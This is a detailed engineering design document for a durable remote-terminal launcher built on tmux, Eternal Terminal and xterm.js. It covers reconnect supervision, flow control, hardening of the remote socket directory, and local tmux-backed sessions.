# Design Doc: Durable Remote Terminal (working name: TBD)

> A cmux-style terminal launcher where remote processes persist server-side and the
> local client auto-reconnects after connection drops or app restarts.

**Status:** Draft · **Date:** 2026-07-09

> **Code layout note (2026-08-04):** the app is now Tauri + Rust (`src-tauri/` + `ui/`);
> the Electron MVP this doc's earlier sections were written against has been deleted
> (git history and `main` have it). Where a section cites an old `src/…/*.js` path, the
> module lives on as its Rust port — see the table in `TAURI_MIGRATION.md`.

---

## 1. Motivation

`cmux` (manaflow-ai/cmux) does roughly what we want — a session-oriented terminal
that attaches to remote tmux — but we found it **not stable enough**. This project
rebuilds that workflow with a focus on:

- **Durability**: remote processes keep running regardless of local connection state.
- **Auto-reconnect**: the local client re-attaches to the remote session
  automatically after a network drop *and* after the app is closed and reopened.
- **A sidebar** listing sessions/projects for quick switching.
- **Stability** over feature breadth.

### Why not just use an existing terminal + tmux? (scope honesty)

The combo **`et host -c 'tmux new -A -s x'` in WezTerm/iTerm already delivers essentially
all of §1's durability, reconnect, and cross-restart persistence** — for free, with far
fewer moving parts. This must be stated plainly because the stated goal is **stability**,
yet this proposal adds Electron + React + xterm.js + node-pty + a respawn supervisor +
persistence + WebGL-context-loss handling — strictly *more* surface area than the baseline
it replaces. More parts is not obviously more stable.

**The one irreducible feature the baseline can't give us is the session-management
sidebar** (a persistent, clickable list of remote sessions with status, add/rename/remove,
restore-on-launch). That — and only that — is the justification for a custom app.

### Lower-surface alternatives that ALSO deliver a sidebar (evaluate before building)

Because the thesis is "stability = fewer parts," we must show the sidebar actually
*requires* this stack. Two materially cheaper designs deliver a session list:

1. **tmux control mode (`tmux -CC`)** — iTerm2's tmux integration is a shipping existence
   proof: a terminal driving `tmux -CC` gets a programmatic window/session list (native
   tabs mapped to tmux windows) with **none** of this app's supervisor/pty/render surface.
   A `tmux -CC` client over et could yield a sidebar at a fraction of the risk. Cost: we'd
   be building/using a control-mode client, and control mode's UX model differs from raw
   attach.
2. **TUI session picker** — `sesh`/`fzf` over `tmux ls`, launched in the baseline terminal,
   gives a keyboard-driven session list with ~zero custom app code. Loses the always-
   visible graphical sidebar, but meets most of the need.

**Decision gate (falsifiable, must resolve before Milestone 1):** *Spike a `tmux -CC`
control-mode client (over et) for ~1 day.* **If** it yields a clickable session list with
per-session status/rename/restore that meets the need → **this app is cancelled** in favor
of that plus a thin config. The full Electron app is justified **only if** that spike fails
to deliver a usable session panel — i.e. the sidebar demonstrably needs a persistent
graphical panel those approaches can't provide. Owner: the project author records the spike
outcome here before any Milestone-1 code. This is a binding build/don't-build test, not a
rationalization.

---

## 2. Core Architecture Principle

Three **different** durability layers, each covering a distinct failure. Getting the
attribution right matters — an earlier draft conflated them:

| Layer | Owner | Covers | Does NOT cover |
|---|---|---|---|
| **Cross-restart persistence** | **tmux on the remote** | Client process death, app close/reopen, laptop reboot. `tmux new -A -s <name>` = attach if exists, else create (the **app always adds `-D`** — §5.1 — to detach stale clients; the bare form here is just the generic durability concept). Processes keep running server-side. | Nothing about the network link. |
| **In-session drop resilience** | **`et` (Eternal Terminal)** | Transient TCP drops, sleep/wake, IP changes — et's BackedReader/BackedWriter buffers the last N bytes and resumes **without exiting**. | et's resume state lives **in the client process**; closing the app destroys it. et does **not** survive app restart. |
| **Hard-failure bridge** | **The app (respawn)** | et exiting for a *transient* reason after giving up. Bounded, backoff-gated — see §5.1. | Fatal causes (auth, missing binary, dead host, user detach) → must NOT respawn. |
| **Layout / UI** | **The app** | Sidebar, tabs, session list, reconnect/dead indicators. | — |
| **Rendering** | **xterm.js** (initially) | Drawing the terminal grid. Behind a transport-level seam — see §7. | — |

**Key correction:** "reopen the app and reconnect" is delivered by **tmux**, not et. et
covers only *in-session* drops while the client is alive. The app's respawn is a *bounded
bridge*, not the reconnect mechanism, and it is **not** redundant with et — they cover
different layers (see §5.1 for why naive respawn is dangerous).

Honest baseline: **`et host -c 'tmux new -A -s x'` in any existing terminal already
delivers durability + reconnect + cross-restart persistence.** The sole product delta of
this app is the **session-management sidebar/UI** (§1). We are not reinventing durability;
we are wrapping a UI around it.

---

## 3. Technology Decisions

> Defaults chosen; **marked items need confirmation**.

| Layer | Choice | Rationale |
|---|---|---|
| **Shell / windows** | **Electron** | One bundled Chromium → *far less rendering variance* than Tauri's 3 webviews (NOT pixel-identical — glyphs still route through per-OS rasterizers CoreText/DirectWrite/FreeType). Most mature terminal stack (VS Code, Hyper, Tabby). Trade binary size/RAM for consistency. **Rendering consistency ≠ feature parity:** the OOB channel needs a local tmux binary, so Windows has a materially degraded feature set (§9.0) — resolve platform scope in §9 Q5. |
| **Terminal view** | **xterm.js** (`@xterm/xterm`, current scoped pkg) + **`@xterm/addon-webgl`** + **`@xterm/addon-fit`** | Engine **and** renderer for web/Electron. **WebGL only for the focused/visible terminal** — Chromium caps live WebGL contexts (~8–16, LRU-evicted), so a per-session WebGL context would evict older panes' contexts and fire `webglcontextlost` on them. Background sessions use the **DOM renderer** (the canvas addon is no longer part of current xterm.js — WebGL and DOM are the only renderers) or dispose their WebGL addon on hide. See §8. |
| **PTY** | **node-pty** | Spawns the pty in the main process; battle-tested (VS Code uses it). |
| **Connection layer** | **`et` (Eternal Terminal)** ⚠️ *confirm* | Best auto-reconnect. Needs `etserver` + open port on remote. Alternatives: `mosh` (UDP, roams networks), `ssh`+`autossh` (no remote install, crudest). |
| **Frontend framework** | **React + TypeScript** ⚠️ *confirm* | Good ergonomics for sidebar/session list/tabs. Alt: plain TS (lighter). |
| **Scaffold tooling** | **electron-vite** ⚠️ *confirm* | Fast HMR, sensible main/preload/renderer split. Alts: Electron Forge, minimal hand-rolled. |

### Why Electron over Tauri (for now)

- Tauri uses the **OS webview** → xterm.js would run on **3 different engines**
  (WebKit/mac, WebView2/Windows, WebKitGTK/Linux). WebGL quality/perf varies, and
  **WebKitGTK on Linux is the weak link** (slower, packaging fiddly).
- Electron's single Chromium gives **consistent rendering** everywhere — the right
  call while validating the product.
- Cost accepted: larger binaries, higher RAM.

### Why xterm.js over alacritty_terminal / libghostty (for now)

- **xterm.js** = engine + renderer, purpose-built for web/Electron. Fastest path to a
  working product.
- **alacritty_terminal** = engine only (Rust); we'd have to write a renderer. Reserved
  for a *future* native/wgpu path if we outgrow xterm.js (§8).
- **libghostty** = engine + GPU rendering, but embedding is **macOS-first**, not
  cross-platform, and the C API is young. Rejected on cross-platform grounds.
- Note: xterm.js and alacritty_terminal are **both engines** — never used together;
  one replaces the other.

---

## 4. Process & Data Flow

```
Main process (Node)                     Renderer process (Chromium)
─────────────────────                   ────────────────────────────
node-pty: spawn                         xterm.js + WebGL(focused) + fit  (view)
  et …-c 'tmux -S … new -A -D…' -- host  React sidebar (session list, tabs)
respawn supervisor (backoff, §5.1)      resize → fitAddon.fit()
session persistence (disk)              status: connected/reconnecting/dead
input validation (§6)                            │            ▲
        │            ▲                            │            │
        └──── IPC (pty bytes both ways) ──────────┘            │
              + resize {cols,rows}, spawn, kill, ACK ──────────┘
              + session events
```

- **Data down (pty → view)**: `pty.onData` → IPC → `term.write(data)` (`string` in v1, §7).
- **Data up (view → pty)**: `term.onData` → IPC → `pty.write(data)`.
- **Resize**: `fitAddon.fit()` → `{cols, rows}` → IPC → `pty.resize(cols, rows)`.
  Must fire on window resize **and** on reattach — see §5.4 for the reattach ordering.
  (This is the #1 xterm.js bug source.)

### 4.1 Backpressure / flow control (v1 correctness requirement, not optional)

xterm.js `write()` is non-blocking and buffers; **past a ~50 MB internal buffer it
silently *discards* input** (per the xterm.js flow-control guide), and with a socket/IPC
in the path naive buffering "isn't reliable." A `cat hugefile` / `yes` / verbose build
over the remote pty will therefore **corrupt the display or wedge the terminal** on day
one unless we plumb backpressure end-to-end. This is *not* the §8 "throughput ceiling
later" concern — it is a correctness bug without a fix.

Mechanism (must exist in v1):
- Use `term.write(data, callback)` in the renderer; the callback ACKs bytes over IPC.
- **Watermark accounting lives in MAIN** (driven by renderer ACKs), because `pty.pause()`
  is a main-side call — main tracks unacked bytes and, over HIGH watermark, calls
  **`pty.pause()`**; resumes with **`pty.resume()`** below LOW. (`pause`/`resume` are real
  node-pty APIs.) Suggested watermarks per the xterm.js guide: HIGH ~100 KB (≤500 KB), LOW
  ~10 KB.
- **What this does NOT do — corrected overclaim:** pausing node-pty does **not** reliably
  backpressure the *remote* producer. node-pty's child is the **et client**; et uses
  independent reader/writer paths and its own BackedReader/BackedWriter buffer, so its
  reader keeps draining the socket into **client-side memory** even while its stdout write
  is blocked. So the effect is: the local pty pipe fills, but the **buffer relocates into
  et's client memory + TCP windows** — the remote `yes`/`cat` keeps producing. Treat et as
  an effectively **infinite-buffer datasink** (the same caveat the xterm.js guide gives for
  websockets).
- **What v1 actually guarantees:** the *xterm.js* buffer never overflows (no silent
  discard, no wedge). It does **not** bound et's client memory under a sustained remote
  firehose, and the app **cannot** bound et's internal BackedReader buffer via any API —
  `pty.pause()` doesn't reach it. Be honest about this rather than implying "monitor" fixes
  it:
  - **Backstop = userspace watchdog, NOT rlimit.** `RLIMIT_RSS` is a **no-op on modern
    Linux** (effective only on Linux 2.4.x <30) and **unenforced on macOS** (verified);
    cgroups are Linux-only; so "set an RSS rlimit on the et child" — an earlier draft's
    "only real lever" — **does nothing on all three target platforms.** Instead the
    supervisor **samples et-client RSS (§11) on a fixed interval and acts on a ceiling.**
  - **Avoid the kill→reattach→refill livelock.** A blind kill+reconnect re-attaches to the
    *same* tmux session where `yes` is still running → the flood resumes → RSS climbs → kill
    again, forever, and the user never regains control. So: (1) size the ceiling for the
    interval (`ceiling ≥ interval × max-drain-rate` + headroom) so a fast firehose can't OOM
    *between* samples; (2) on **repeated** trips within a window, do **not** blind-reconnect
    — transition to a distinct **`throttled`** state (stop reading the pty / require user
    ack) rather than looping. The trip counter MUST be a **wall-clock sliding window keyed
    by session id that persists across the kill→`reconnecting`→`connected` cycle** — a
    per-connection counter that resets on each `connected` would never reach "repeated"
    (every reconnect starts fresh) and the livelock recurs, just paced by the reconnect
    interval. Rule: **N trips within T seconds → `throttled`**, regardless of intervening
    reconnects. (3) **watchdog kills are NOT auth failures — exclude them from the lifetime
    auth-attempt cap (§5.1)**, or a merely-noisy healthy session gets driven to `dead` by a
    dead-host protection. tmux persisted the session, so no work is lost across a watchdog
    kill — this is kill-and-recover, not true backpressure.
  - **Optional per-OS hard cap** layered under the watchdog: Linux → cgroup v2
    `memory.max` (or `RLIMIT_AS`, noting it caps virtual address space and can over-count);
    Windows → **Job Object** `JOB_OBJECT_LIMIT_PROCESS_MEMORY`; macOS → no clean per-process
    RSS cap exists, so the userspace watchdog *is* the mechanism there.
  - If throttling remote *production* is ever needed, it must be done **remote-side** (a
    rate limit / reduced tmux buffering); `tmux history-limit` does **not** help here.
  - v1 accepts **unbounded-lag-but-no-corruption**, with the RSS watchdog as the OOM
    backstop. §11 tracks et-client RSS + IPC queue depth and **drives the kill lever**.

---

## 5. Key Features & How They Work

### 5.1 Durable sessions + bounded reconnect

**Correct launch command** (verified against `et` v7.0.0 — `et --help`): et has **no `--`
passthrough**. Remote commands run via **`-c`**, which *exits after the command returns*
(`-e/--noexit` keeps it open). The command is a **shell string on the remote**, so inputs
must be validated (§6):

```js
// host, session, port, user validated/decomposed in main process FIRST (§6)
// -D detaches other clients on attach → no size-fight (§5.1). NO -x/-y: they are
// IGNORED on the attach path (verified, tmux 3.6a); the pty winsize below is what sizes.
// -S pins a deterministic remote socket for the OOB channel (§5.2); set-option pins
// window-size latest so reattach tracks the client even under a largest/manual tmux.conf.
const dir = `/tmp/et-${remoteUser}`, sock = `${dir}/et-${id}.sock`   // per-user 0700 (§6.1)
// Create the socket dir first, EVERY time: tmux -S with a missing parent dir prints
// "error creating … (No such file or directory)" and STILL exits 0 (verified) → silent
// no-server. Use `mkdir -m 700` (NOT `mkdir -p … && chmod 700`): on a shared host a
// co-tenant can squat the predictable path, and `mkdir -p` on an existing dir returns 0
// WITHOUT reasserting mode/owner (verified) → the "0700 protection" is a no-op and chmod
// on a foreign-owned dir EPERMs. `mkdir -m 700 ${dir}` fails atomically (rc≠0) if the path
// already exists, so a squat is DETECTED (→ surface a distinct error, not silent `dead`),
// and we then verify it's a real dir (not a symlink) owned by us before binding.
pty.spawn('et', [...etArgs, '-t', `${sock}:${sock}`,
  '-c', `{ mkdir -m 700 ${dir} 2>/dev/null || [ -O ${dir} -a ! -L ${dir} ]; } && ` +
        `tmux -S ${sock} new-session -A -D -s ${session} \\; set-option window-size latest`,
  '--', host],   // <-- -c MUST precede --; host is the sole positional after --
  { cols, rows, ... })   // {cols,rows} (the pty winsize) is the real size source
```
(`-O` = owned by our euid, `! -L` = not a symlink; so we proceed only if we just created the
0700 dir, or it already exists as our own real dir — a foreign/symlinked squat fails closed
and is surfaced, not silently retried into `dead`. Alternatively place the socket under
`$XDG_RUNTIME_DIR`/`$TMUX_TMPDIR`, which is already a per-user 0700 dir.)
The **local** side must likewise `mkdir -p` its half of the forward dir before `et -t`
binds. **Never treat tmux's exit code as bind-success** (it returns 0 even when the socket
wasn't created) — confirm success by the OOB poll finding the socket / `list-clients` rows
(§5.2).

This is **the** canonical launch command; §2/§4/§5.2/§5.4/§10 refer to it.
**Argv order is load-bearing (verified):** `--` halts et's flag parsing and everything
after it is positional, so `-c <payload>` placed *after* `--` is **silently dropped** — et
opens a bare shell, no tmux session, no `-S` socket, OOB channel never connects. Therefore
`-c '<payload>'` comes **before** `--`, and `<host>` is the **sole** token after `--` (which
still gives the §6.1 leading-`-` host defense).

> **Sizing — corrected mechanism.** An earlier draft claimed `-x/-y` "bake in" the size.
> **Verified false:** `-x/-y` are honored *only* on detached create (`new -d`); on attach
> (and attached-create) tmux **ignores them and adopts the client/pty winsize**. Correct
> sizing therefore comes from spawning the et pty at the fitted `{cols, rows}`, combined
> with tmux's default **`window-size latest`** (window tracks the most-recent client) so
> reattach re-sizes. Two consequences: (1) the pty MUST be spawned at the fitted size
> (§5.4); (2) if a user/corp `tmux.conf` sets `window-size largest|manual`, reattach won't
> track — so **pin it inside the `-c` payload** (`tmux new-session -A -D -s <s> \; set-option
> window-size latest`; note `tmux new -o`/`attach -o` are **invalid** — `unknown flag -o`,
> verified) and keep an explicit post-attach `pty.resize()` as insurance.

**Layer roles (see §2):** et handles *transient in-session drops without exiting*; tmux
persists the session server-side across client/app death. The app's `onExit` respawn is a
**bounded bridge for hard et exits only**.

**Exit codes do NOT carry a usable transient-vs-fatal signal — verified.** Running
`et -c 'tmux new -A -s x' <host>` against both an unreachable host and a refusing host
returns **exit `1` with the byte-identical message `Could not reach the ET server:
<host>:2022`**, and that diagnostic is written to **stdout** — i.e. into the same pty byte
stream as terminal content, with no clean side channel. So an earlier draft's "classify
transient vs fatal by exit code, respawn only transient" is **not implementable**. Revised
supervisor:

- **Clean exit (code 0) = intentional → never respawn.** `et -c '…'` (no `-e`) **exits
  when the tmux client returns** — which happens on an *in-terminal* `Ctrl-b d` detach the
  user types inside xterm.js, not just on an app-UI close. An `intentionalClose` flag set
  only by app actions **cannot see** an in-terminal detach, so respawning on exit-0 would
  yank the user back into a session they deliberately left — regressing below the raw
  `et+tmux` baseline. **Rule: exit code 0 ⇒ user left on purpose ⇒ no respawn** (gray out /
  offer reconnect). Only *non-zero* exits are candidates for respawn. Verified locally: a
  clean tmux `detach-client` yields client exit **0** while the session survives, and
  unreachable/refused hosts yield exit **1** — so 0-vs-nonzero is a real signal. **Residual
  risk** (Milestone 0, needs a live `etserver`): whether `et -c` *propagates* tmux's exit 0
  vs. always returning 0. If it does not propagate, the fallback becomes the **primary**
  plan — run et with `-e/--noexit` and drive detach/close through explicit app actions.
  Emit an **observable event** whenever "exit-0 ⇒ no respawn" fires (§11), so a
  mis-propagated exit-0 that silently fails to reconnect a wanted session is visible.
  **Gate the rule on "no respawn in flight for this session id":** if client B reconnects
  with `-D` and detaches a still-live client A, A exits 0 — which must NOT be read as user
  intent. Only treat exit 0 as intentional when the supervisor didn't itself just trigger a
  detaching reconnect.
- **Also honor `intentionalClose`** for app-initiated close/kill: it suppresses respawn
  **and cancels any pending backoff timer** — a queued respawn must not fire after dismiss.
- **No fine-grained transient/fatal classification** (exit codes carry no usable signal, as
  verified above). Every *non-zero* exit → retry with capped exponential backoff
  (1s, 2s, 4s … max 30s), then state **`dead`** + "click to retry".
- **Bound total auth attempts, not just CPU (ssh-lockout risk).** et bootstraps over ssh,
  so each respawn is a fresh ssh auth attempt. A host with an expired key / wrong principal
  / bastion MFA behind PAM `faillock` can be **locked out** by an unbounded retry burst —
  unacceptable for a "stability" app. So: cap **lifetime** attempts per session (not just
  per-burst), and enforce a **long floor** (e.g. ≥30s) between user-initiated "retry"
  clicks. Bounding CPU is not bounding auth.
- **Prevent double-attach with `-D`, not by "awaiting exit."** Killing the *local* et
  process does **not** immediately drop the *remote* tmux client — it lingers until the
  remote notices the dead connection (keepalive/TCP timeout). A respawn can attach a
  *second* client while the first lingers; tmux then sizes to the **smallest** client (the
  size-fight). Fix deterministically with **`tmux new-session -A -D -s <session>`** — `-D`
  detaches other clients on attach (verified, tmux 3.6a man page). This also covers the
  **cross-restart** orphan case (app crash → orphan et client → relaunch re-attaches).
- **Reap the local orphan precisely — never pattern-kill.** `-D` handles the *remote*
  lingering client; a crashed app can also leave a local `et` child (reparented to init, no
  live handle). Do **not** `pkill et` — that would kill the user's unrelated et sessions
  (the same collateral-damage class as `-x`). Instead **persist each child's PID + a
  start-time/argv fingerprint** alongside the session file; on startup, reap only exact
  fingerprint matches before re-attaching.
- **Cause visibility** (for the sidebar's dead-state reason): run et with `-l <logdir>` /
  `--logtostdout -v N` and read et's **structured log on a side channel** — never scrape
  the pty stdout stream (et's own "Could not reach…" diagnostic is written there,
  intermixed with terminal output; verified).

### 5.2 Restore on app reopen (restores *connections*, not *state*)

- Persist `[{ id, host, session, title, order, lastActive }]` to disk at
  `app.getPath('userData')`. **Treat this file as untrusted input on load** — re-validate
  `host`/`session` (§6) before use.
- On launch, **lazy-connect**: spawn only the last-active session eagerly; connect others
  on first focus. (Spawning all at once = N simultaneous ssh/et handshakes, and any dead
  host trips the §5.1 backoff loop N-fold — a thundering herd on startup.)
- **What actually survives:** tmux (server-side) survives app restart; et's in-client
  resume buffer does **not**. So restore = re-run et → re-attach the still-living tmux
  session. **If the remote rebooted, the tmux server is gone and `new -A -D` silently
  creates a fresh empty session** → silent data-loss illusion.
  - **Keep the single atomic launch command** `tmux new-session -A -D -s <s>` (§5.1) — do
    **not** switch to a `has-session && attach || new` compound: that is (a) **broken** —
    `tmux attach -D` is an invalid flag (`-D` is `new-session`-only; verified: `command
    attach-session: unknown flag -D`), so on a *live* session it would fail to attach and
    fire a false "lost" alarm on every reconnect; (b) a **TOCTOU race** (two clients both
    see "no session" and both create); and (c) its create branch drops `-D`, reintroducing
    the size-fight §5.1 fixed.
  - **A real out-of-band control channel is required — and a single blocking `et -c
    'tmux …'` pty does NOT provide one.** That invocation yields exactly one pty byte
    stream; there is no second channel to run a `tmux display-message` query on, and the
    banner-vs-tmux ambiguity (§5.4) means the byte stream itself can't be parsed for control
    state (which §5.2 forbids anyway). **This is the control-plane transport the design
    must name** (it also gates the `connecting→connected` transition, §5.3):
    - **Chosen mechanism: forward the remote tmux server socket over the same et
      connection** (et's `-t` supports unix-socket forwards; verified in `et --help`).
      *Expected* — and to be **confirmed in Milestone 0 against a live host** — that a local
      `tmux -S` client's one-shot *control queries* (`display-message`, `list-clients`)
      survive a plain byte forward (they don't use fd/credential passing, unlike attach). The
      whole OOB channel rides on this, so it is an explicit M0 gate, not an assumed fact.
    - **App-control the remote socket path — do NOT rely on tmux's default.** The default
      `/tmp/tmux-<remote-uid>/default` depends on the **remote uid** (which the app doesn't
      know — it knows the *username*, not uid) and on remote `$TMUX_TMPDIR`, so a guessed
      path forwards to nothing → session hangs in `connecting`. Instead **pin a deterministic
      remote socket in the `-c` payload** (see the canonical command, §5.1) and forward that
      exact path. **Namespace under a per-user dir created with `mkdir -m 700`** —
      `/tmp/et-<user>/et-<id>.sock`, not bare `/tmp/et-<id>.sock` (`<id>` per-session avoids
      multi-session/cross-host collision). **Threat model, stated honestly:** this closes
      *hijack* (a co-tenant can't get the app to bind/adopt an attacker-owned or symlinked
      dir — the `mkdir -m 700` + `-O`/`! -L` check fails closed, §5.1). It does **not** fully
      close *squatting*: a co-tenant who pre-creates `/tmp/et-<user>` can cause the victim's
      `mkdir -m 700` to fail every time → a persistent **DoS** (session surfaces a distinct
      "socket dir squatted" error rather than silently going `dead`). Fully eliminating the
      DoS requires an unpredictable path (`/tmp/et-<user>-<rand>/`) or `$XDG_RUNTIME_DIR`.
    - **The remote `-S` socket doesn't exist until the `-c` payload's `tmux new-session`
      runs** (a few hundred ms after connect), so the OOB probe must **poll/retry** until it
      appears. **Poll on query *output* rows, not exit code, for attach-detection:** a
      missing-socket query deterministically returns rc 1 (`error connecting …`) and an
      attached-but-no-clients query returns rc 0 + empty — so treat *both* "error connecting"
      and "zero client rows" as not-yet-attached, and poll until real `list-clients -t
      <session>` rows appear or the §5.3 timeout fires. (rc alone can't distinguish
      "connected, nobody attached yet" from "attached," which is the distinction we need.)
    - **Every OOB query MUST target `-t <session>`.** On the shared remote tmux server a
      target-less `display-message`/`list-clients` returns an **arbitrary** session
      (verified: it returned a *different* session's `session_created`), causing false
      `lost` alarms and wrong connect-detection. Use
      `tmux -S <sock> display-message -p -t <session> '#{session_created}'` and
      `list-clients -t <session>` (the `<session>` charset is validated, §6.1). This runs
      **out-of-band on the one connection** — no second ssh auth, no in-band bytes — and
      drives both "attached yet?" (§5.3) and lost-session detection.
    - **tmux protocol-version lockstep is a prerequisite (§9.0).** The OOB queries run the
      **local** tmux binary as a client against the **remote** tmux server socket, and tmux
      enforces strict protocol-version match (`protocol version mismatch`). If the local and
      remote tmux protocol versions differ, the queries fail — connect-confirmation falls
      back to the §5.3 timeout and **lost-detection silently stops working — which reopens
      exactly the silent-fresh-session data-loss illusion this channel was added to prevent**
      (rebooted remote → `new -A -D` makes a fresh empty session, undetected). So **treat
      matching local/remote tmux as a hard setup requirement (§9.0), not a soft note**, or
      run the queries with the *remote* binary via `-CC` control mode (the §1 spike
      alternative), where client and server are the same binary.
    - **Clean up the stale local forward socket on startup** (§5.1 reap pass): `unlink` the
      per-session forward socket before re-binding, else `et -t` fails with "address already
      in use" after a crash.
    - **Alternative: tmux control mode (`-CC`)** — gives structured attach/exit/session
      events natively out-of-band. This is the same capability §1's decision-gate spike
      evaluates; if that spike wins, this whole channel problem dissolves.
  - **Lost-session detection: persist the REMOTE `#{session_created}` at first successful
    attach; on reattach, flag `lost` iff the queried value differs.** Verified:
    `session_created` persists across `new -A -D` (same epoch) and changes across a
    kill-server/reboot. Do **not** compare against local app-start time — it's a *remote*
    clock, so skew/NTP steps would cause false alarms. First run has no baseline (nothing to
    lose yet).
  - **Never** derive app control state from the terminal byte stream (no in-band sentinel).
- **Scrollback expectation:** reattach redraws only the *current screen*; historical
  scrollback lives in tmux copy-mode (reachable via tmux keys), **not** replayed into
  xterm.js. Set a generous tmux `history-limit`; do not promise scrollback restore.
- App-owned state we *do* restore: tab order, focus, titles. Per-session working dir /
  running program is owned by tmux, not us.

### 5.3 Sidebar

- Left panel listing sessions/projects.
- Click → focus that terminal.
- Add/remove/rename sessions.

**Per-session state machine** (drives the status indicator):

| State | Enter when | Leaves to |
|---|---|---|
| `idle` | Persisted but not yet connected (lazy, §5.2) | `connecting` on focus/spawn |
| `connecting` | pty spawned, awaiting tmux attach | `connected` when the **OOB channel** (§5.2, forwarded tmux socket / `-CC`) confirms a client is attached — **not** "first pty data" (that's the et banner, §5.4); `reconnecting` on non-zero exit; `dead` if attempts exhausted. **OOB-confirm timeout:** if the OOB channel doesn't confirm within a bound but the pty is alive, optimistically go `connected` (demote OOB to lost-detection only) so a broken forward can't hang the session forever. |
| `connected` | OOB channel confirms attach (or timeout, above) | `closed` on exit 0 (intentional, §5.1); `reconnecting` on non-zero exit; `throttled` on repeated watchdog trips (§4.1) |
| `throttled` | Repeated RSS-watchdog trips (§4.1) — pty reads paused | `connected` on user ack/resume; `closed` on user close |
| `reconnecting` | Non-zero exit, backoff timer pending | `connected` on success; `dead` at lifetime-attempt cap; `closed` if user closes mid-backoff (cancels timer) |
| `dead` | Retry cap reached | `connecting` on user "retry" (subject to ≥30s floor, §5.1) |
| `closed` | Clean exit 0 / user close | `connecting` on user reconnect |
| `lost` (flag) | Reattach found a freshly-created session (§5.2) | overlays `connected`; cleared on ack |

### 5.3b Local sessions (`kind:'local'`) — tmux-backed, durable like remote

The new-session dialog offers **Local shell** alongside a remote host: a shell on *this* machine —
but run **inside tmux**, exactly as a remote session is. There is no separate local session
architecture; local is one value of a `Transport` enum, and everything downstream (control-mode
parser, window registry, reconnect supervisor, session store) is shared verbatim.

- **Why tmux locally, when there is no network to drop?** Durability is not only about the network.
  A tmux server outlives the app, so quitting Buoy (or crashing it, or updating it) no longer kills
  the work in a local shell — reopening the project reattaches to the running shell with scrollback
  and jobs intact. Local sessions also get **native tabs** for free, because control mode is the same
  protocol locally: verified empirically that `tmux -CC new-session -A -D` on the local machine emits
  the same `%begin` / `%window-add` / `%output` stream as over ssh. Reusing one implementation is the
  point: a parallel local path would drift from the remote one it is supposed to mirror.
- **Transport is the only axis of difference** (`transport.rs`). `spawn_spec(transport, control, …)`
  returns a `SpawnSpec { program, args, env }`: for `Ssh` the program is `ssh` with the tmux command
  as a remote argv; for `Local` the program *is* tmux, with no ssh scaffolding and no host. Both
  backends (`control_backend.rs`, `plain_backend.rs`) build their child from that spec, so neither
  contains a local special case. TC-T1 is a regression guard that the remote spec is byte-identical
  to before this change.
- **Three modes, chosen by `choose_mode()`** — extracted as a pure function because `create_session`
  needs a live `AppHandle` and can't be unit-tested (TC-CM1/TC-CM2 cover the full matrix):

  | condition | `mode` | tabs | durable |
  |---|---|---|---|
  | local, tmux ≥ 3.2, Native tabs on | `"control"` | native (tmux windows) | yes |
  | local, tmux < 3.2 **or** Native tabs off | `"plain"` | one implicit tab | yes (tmux holds it) |
  | local, **no tmux installed** | `"local"` | one implicit tab | **no** |

  The raw-pty `LocalBackend` is now a **fallback only**, for a machine without tmux — the single
  remaining non-durable session type. Installing tmux upgrades a local session to the durable path
  with no other change. "Native tabs off" downgrades to `plain`, not to the raw pty: the user opted
  out of tabs, not out of durability.
- **Persisted** (`persist = !no_local_tmux`), because the tmux server outlives the app and the store
  row is the only way back to it. Two guards in `session_store.rs` had to be relaxed for this and had
  silently dropped local rows: `load()` ran `parse_host` on every row (a local row's host is
  legitimately **empty**), and load/save clamped `mode` to `control|plain` (rewriting the no-tmux
  `"local"` mode). A local row **with** a host is still rejected as malformed — local mode must not
  become a hole that smuggles an unvalidated host into argv construction (TC-SS-L1/L2). Only the
  no-tmux fallback session is skipped, since there is nothing to reattach to.
- **The renderer keys off `mode`, never `kind`** — so `makeView`/`statusLine`/`isConsoleLive` needed
  no local branches. On restore, a `transport:"local"` row must be rebuilt as `kind:'local'`; treating
  it as remote would build ssh args for an empty host. The Native-tabs toggle moved **out** of
  `#remote-fields` (it now applies to both kinds), and the sidebar subtitle shows `local shell` plus
  the tmux-version badge — its absence is the signal that this session is the non-durable fallback.
- **Version-tagged, per-mode sockets** (`socket_name`): control → `dtcc<maj>-<min>-<session>`
  (per-session, because two `-CC` clients on one server detach each other); plain → `dtapp<maj>-<min>`
  (shared). `session_kill` tears a local server down directly via `build_local_kill_args`
  (`tmux -L <sock> kill-session -t <name>`) instead of the ssh kill path.
- **Local probing re-runs every time**, unlike the ssh probe. `probe_local_tmux()` walks the augmented
  PATH then absolute candidates (`/opt/homebrew/bin`, `/usr/local/bin`, `/opt/local/bin`, `/usr/bin`,
  `$HOME/.local/bin`), execs each `-V` directly (no shell), skips paths failing the tmuxPath charset,
  and prefers ≥3.2 then highest. It's safe to redo because it costs one local exec — no network, no 8s
  timeout — and a local socket is always reachable, so a re-probe can't strand a server we can't reach.
  The ssh path must stay cached behind `attach_ok` precisely because the version tags the socket.
- **Locale (the `_`-mangling bug).** tmux only stores UTF-8 when its own process locale is UTF-8;
  otherwise every non-ASCII byte becomes `_` (agent tab titles like `✳ task` arrived as `_ task`). The
  ssh path forces `LC_ALL=C.UTF-8` unconditionally, since a remote login often has `LANG` unset. Local
  is different because we can *see* the environment: `local_tmux_lc_all` overrides only when the
  effective locale is **not** already UTF-8 (POSIX precedence: `LC_ALL` outranks `LANG`) — forcing
  `C.UTF-8` over a user's own `en_US.UTF-8` would change their collation and date formatting for no
  benefit. There is deliberately no `env LC_ALL=…` argv prefix locally: with no login shell in
  between, the env goes straight on the child. `TERM=xterm-256color` is also set explicitly, because
  `portable_pty` does not reliably inherit it and an unset `TERM` yields a colorless shell with broken
  full-screen editors.
- **Relative clicked paths** (§17) resolve through `resolve_local_path`: absolute verbatim, `~`/`~/…`
  → `$HOME`, else query the local tmux for `#{pane_current_path}` and join — in Rust rather than an sh
  snippet, since there is no remote shell, which also removes the quoting surface (TC-RF-L1).
- **Bug this fixed: a local session was stuck on "connecting" forever.** A local session had no
  supervisor, so no `session:state` event was ever emitted; `v.state` stayed `'idle'` from `makeView`
  and the "connecting …" status set before `await api.createSession(...)` was never superseded. Routing
  local through the same supervisor fixes it *structurally* rather than by patching the status line —
  the session reports `connected` because it genuinely is. TC-LT3 asserts a local session reaches
  `State::Connected` and emits it.
- **Earlier bug (Tauri migration gap).** The Electron build had `backends/localBackend.js`, never
  ported — so `kind:'local'` fell through to the **ssh** backend, where `build_ssh_args("")` rejects
  the empty host and the UI showed *"failed to connect local: host"*. TC-LB5 pins that root cause so
  nothing routes local back through the ssh builder.
